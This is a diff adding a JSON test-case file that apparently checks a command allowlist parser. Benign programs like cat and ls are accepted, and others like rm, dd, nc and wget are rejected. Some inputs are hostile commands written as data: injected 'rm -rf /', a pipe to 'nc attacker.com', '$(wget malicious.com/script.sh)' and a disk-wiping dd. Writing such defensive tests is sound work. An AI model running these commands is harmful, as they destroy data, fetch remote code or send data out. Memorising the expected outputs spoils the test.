@@ -1,0 +1,122 @@
+[
+    {
+        "input": {
+            "prog_name": "cat",
+            "args": "file.txt"
+        },
+        "expected": "some { prog := \"cat\", args := [\"file.txt\"] }",
+        "unexpected": []
+    },
+    {
+        "input": {
+            "prog_name": "ls",
+            "args": "-la"
+        },
+        "expected": "some { prog := \"ls\", args := [\"-la\"] }",
+        "unexpected": []
+    },
+    {
+        "input": {
+            "prog_name": "echo",
+            "args": "hello world"
+        },
+        "expected": "some { prog := \"echo\", args := [\"hello\", \"world\"] }",
+        "unexpected": []
+    },
+    {
+        "input": {
+            "prog_name": "wc",
+            "args": "-l file.txt"
+        },
+        "expected": "some { prog := \"wc\", args := [\"-l\", \"file.txt\"] }",
+        "unexpected": []
+    },
+    {
+        "input": {
+            "prog_name": "cat",
+            "args": ""
+        },
+        "expected": "some { prog := \"cat\", args := [] }",
+        "unexpected": []
+    },
+    {
+        "input": {
+            "prog_name": "ls",
+            "args": "   "
+        },
+        "expected": "some { prog := \"ls\", args := [] }",
+        "unexpected": []
+    },
+    {
+        "input": {
+            "prog_name": "rm",
+            "args": "file.txt"
+        },
+        "expected": "none",
+        "unexpected": []
+    },
+    {
+        "input": {
+            "prog_name": "cat",
+            "args": "; rm -rf /"
+        },
+        "expected": "some { prog := \"cat\", args := [\";\", \"rm\", \"-rf\", \"/\"] }",
+        "unexpected": []
+    },
+    {
+        "input": {
+            "prog_name": "echo",
+            "args": "| nc attacker.com 1234"
+        },
+        "expected": "some { prog := \"echo\", args := [\"|\", \"nc\", \"attacker.com\", \"1234\"] }",
+        "unexpected": []
+    },
+    {
+        "input": {
+            "prog_name": "wc",
+            "args": "$(wget malicious.com/script.sh)"
+        },
+        "expected": "some { prog := \"wc\", args := [\"$(wget\", \"malicious.com/script.sh)\"] }",
+        "unexpected": []
+    },
+    {
+        "input": {
+            "prog_name": "rm",
+            "args": "-rf /"
+        },
+        "expected": "none",
+        "unexpected": []
+    },
+    {
+        "input": {
+            "prog_name": "dd",
+            "args": "if=/dev/zero of=/dev/sda"
+        },
+        "expected": "none",
+        "unexpected": []
+    },
+    {
+        "input": {
+            "prog_name": "nc",
+            "args": "-l 1234"
+        },
+        "expected": "none",
+        "unexpected": []
+    },
+    {
+        "input": {
+            "prog_name": "wget",
+            "args": "http://malicious.com/script.sh"
+        },
+        "expected": "none",
+        "unexpected": []
+    },
+    {
+        "input": {
+            "prog_name": "/bin/bash",
+            "args": "-c 'rm -rf /'"
+        },
+        "expected": "none",
+        "unexpected": []
+    }
+]
